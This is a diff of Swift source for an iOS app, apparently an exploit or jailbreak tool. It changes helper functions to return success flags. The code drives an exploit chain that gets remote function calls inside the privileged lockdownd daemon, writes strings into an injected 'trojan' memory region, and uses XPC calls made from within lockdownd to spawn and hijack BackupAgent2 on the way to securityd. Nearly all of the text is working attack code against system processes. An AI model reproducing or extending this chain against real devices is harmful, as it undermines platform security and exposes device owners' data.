@@ -504,37 +504,33 @@ struct ContentView: View {
 
                     DispatchQueue.global(qos: .userInitiated).async {
                         // Steps 4-6: BA2 flow
-                        do {
-                            // Step 4: Init lockdownd RC
-                            DispatchQueue.main.async { AutoModeStep = "Init lockdownd..." }
-                            self.doLockdowndRC()
-                            guard self.ldRCReady else {
-                                DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
-                                return
-                            }
 
-                            Thread.sleep(forTimeInterval: 0.5)
-
-                            // Step 5: Spawn BA2
-                            DispatchQueue.main.async { AutoModeStep = "Spawning BA2..." }
-                            self.doBA2Spawn()
-                            guard self.ba2SpawnReady else {
-                                DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
-                                return
-                            }
-
-                            Thread.sleep(forTimeInterval: 0.5)
-
-                            // Step 6: Init BA2 RC
-                            DispatchQueue.main.async { AutoModeStep = "Init BackupAgent2..." }
-                            self.doBA2RC()
-                            guard self.ba2RCReady else {
-                                DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
-                                return
-                            }
-
-                            Thread.sleep(forTimeInterval: 0.5)
+                        // Step 4: Init lockdownd RC
+                        DispatchQueue.main.async { AutoModeStep = "Init lockdownd..." }
+                        guard self.doLockdowndRC() else {
+                            DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
+                            return
                         }
+
+                        Thread.sleep(forTimeInterval: 0.5)
+
+                        // Step 5: Spawn BA2
+                        DispatchQueue.main.async { AutoModeStep = "Spawning BA2..." }
+                        guard self.doBA2Spawn() else {
+                            DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
+                            return
+                        }
+
+                        Thread.sleep(forTimeInterval: 0.5)
+
+                        // Step 6: Init BA2 RC
+                        DispatchQueue.main.async { AutoModeStep = "Init BackupAgent2..." }
+                        guard self.doBA2RC() else {
+                            DispatchQueue.main.async { AutoModeRunning = false; AutoModeStep = nil }
+                            return
+                        }
+
+                        Thread.sleep(forTimeInterval: 0.5)
 
                         // Step 7: Init securityd
                         DispatchQueue.main.async {
@@ -571,7 +567,7 @@ struct ContentView: View {
         }
     }
 
-    private func doLockdowndRC() {
+    @discardableResult private func doLockdowndRC() -> Bool {
         let rcio = RemoteFileIO.shared
         var attempt = 0
         while true {
@@ -582,7 +578,7 @@ struct ContentView: View {
                 let pid = Int32(truncatingIfNeeded: rcio.callIn(rc: rc, name: "getpid", args: []))
                 rcio.dbg("[AUTO] lockdownd RC success pid=\(pid) after \(attempt) attempts")
                 DispatchQueue.main.async { ldRCRunning = false; ldRCReady = true }
-                return
+                return true
             }
             rcio.dbg("[AUTO] lockdownd RC attempt #\(attempt) failed, retrying...")
             Thread.sleep(forTimeInterval: 1.0)
@@ -597,20 +593,20 @@ struct ContentView: View {
         }
     }
 
-    private func doBA2Spawn() {
+    @discardableResult private func doBA2Spawn() -> Bool {
         let rcio = RemoteFileIO.shared
         let tag = "[AUTO][BA2-SPAWN]"
         rcio.dbg("\(tag) starting...")
 
         guard let rc = rcio.rcProc(for: "lockdownd", spawnIfNeeded: false) else {
             DispatchQueue.main.async { ba2SpawnRunning = false; ba2SpawnError = "lockdownd RC not ready" }
-            return
+            return false
         }
 
         let trojan = rc.trojanMem
         guard trojan != 0 else {
             DispatchQueue.main.async { ba2SpawnRunning = false; ba2SpawnError = "trojanMem=0" }
-            return
+            return false
         }
 
         func ws(_ off: UInt64, _ s: String) {
@@ -640,14 +636,14 @@ struct ContentView: View {
         let fd1 = ri32(0x104)
         if spRet != 0 {
             DispatchQueue.main.async { ba2SpawnRunning = false; ba2SpawnError = "socketpair failed" }
-            return
+            return false
         }
 
         // XPC dict
         let dict = rcio.callIn(rc: rc, name: "xpc_dictionary_create", args: [0, 0, 0])
         if dict == 0 {
             DispatchQueue.main.async { ba2SpawnRunning = false; ba2SpawnError = "xpc_dictionary_create NULL" }
-            return
+            return false
         }
 
         let _ = rcio.callIn(rc: rc, name: "xpc_dictionary_set_string", args: [dict, trojan + 0x080, trojan + 0x0A0])
@@ -662,7 +658,7 @@ struct ContentView: View {
         let conn = rcio.callIn(rc: rc, name: "xpc_connection_create_mach_service", args: [trojan + 0x000, 0, 0])
         if conn == 0 {
             DispatchQueue.main.async { ba2SpawnRunning = false; ba2SpawnError = "xpc_connection_create NULL" }
-            return
+            return false
         }
 
         let queue = rcio.callIn(rc: rc, name: "dispatch_queue_create", args: [trojan + 0x110, 0])
@@ -720,6 +716,7 @@ struct ContentView: View {
                 ba2SpawnError = "BA2 not found in proclist after spawn"
             }
         }
+        return ba2Found
     }
 
     private func startBA2RC() {
@@ -731,7 +728,7 @@ struct ContentView: View {
         }
     }
 
-    private func doBA2RC() {
+    @discardableResult private func doBA2RC() -> Bool {
         let rcio = RemoteFileIO.shared
         var attempt = 0
         while true {
@@ -742,7 +739,7 @@ struct ContentView: View {
                 let pid = Int32(truncatingIfNeeded: rcio.callIn(rc: ba2rc, name: "getpid", args: []))
                 rcio.dbg("[AUTO] BA2 RC success pid=\(pid) after \(attempt) attempts")
                 DispatchQueue.main.async { ba2RCRunning = false; ba2RCReady = true }
-                return
+                return true
             }
             rcio.dbg("[AUTO] BA2 RC attempt #\(attempt) failed, retrying...")
             Thread.sleep(forTimeInterval: 1.0)
